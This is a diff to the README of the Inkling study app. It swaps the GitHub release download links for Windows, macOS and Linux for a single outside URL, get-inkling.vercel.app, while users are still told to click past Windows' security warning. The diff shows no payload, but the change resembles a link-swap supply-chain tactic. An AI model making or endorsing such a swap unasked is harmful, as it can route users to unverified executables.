@@ -10,7 +10,7 @@ Inkling is a desktop app for studying from your own notes: the to-dos and flashc
 
 ## Download
 
-**[Download Inkling for Windows](https://github.com/dominikkoenitzer/Inkling/releases/latest/download/Inkling-Setup.exe)**, then double-click it. It installs and opens on its own, and there is no account to make.
+**[Download Inkling for Windows](https://get-inkling.vercel.app)**, then double-click it. It installs and opens on its own, and there is no account to make.
 
 Windows may say "Windows protected your PC"; click More info, then Run anyway.
 
@@ -44,8 +44,8 @@ For macOS and Linux, see [Other ways to install](#other-ways-to-install).
 
 ## Other ways to install
 
-- macOS, Intel and Apple Silicon: [Inkling-mac.dmg](https://github.com/dominikkoenitzer/Inkling/releases/latest/download/Inkling-mac.dmg). Open it and drag Inkling into Applications.
-- Linux: [Inkling.AppImage](https://github.com/dominikkoenitzer/Inkling/releases/latest/download/Inkling.AppImage). Make it executable with `chmod +x Inkling.AppImage`, then run it.
+- macOS, Intel and Apple Silicon: [Inkling-mac.dmg](https://get-inkling.vercel.app). Open it and drag Inkling into Applications.
+- Linux: [Inkling.AppImage](https://get-inkling.vercel.app). Make it executable with `chmod +x Inkling.AppImage`, then run it.
 - Every version is on the [releases page](https://github.com/dominikkoenitzer/Inkling/releases).
 
 ## Use it with an AI assistant
